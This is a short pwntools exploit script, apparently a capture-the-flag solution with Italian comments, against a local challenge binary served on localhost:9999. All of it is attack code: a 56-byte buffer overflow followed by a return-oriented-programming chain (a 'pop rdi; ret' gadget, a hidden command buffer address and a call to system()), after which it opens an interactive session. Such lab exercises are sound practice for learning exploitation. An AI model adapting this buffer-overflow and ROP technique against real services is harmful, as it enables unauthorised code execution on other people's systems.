import sys
from pwn import *


from pwn import *


#pattern create e pattern search -> offset per raggiungere rsp 
buf = b'\x55'* 56

p  = remote('localhost', 9999)
#p = process("./challenge")



#ropper --file  challenge --search "pop rdi; ret;"
pop_rdi = p64(0x0000000000401373)


#gdb info variables -> hiddenCmdBufffer
hiddenCOmmand = p64(0x0000000000404060)


#lo vedo in ghidra sul file challenge
system = p64(0x004011f1)




p.sendline(buf + pop_rdi +hiddenCOmmand+system)

p.interactive()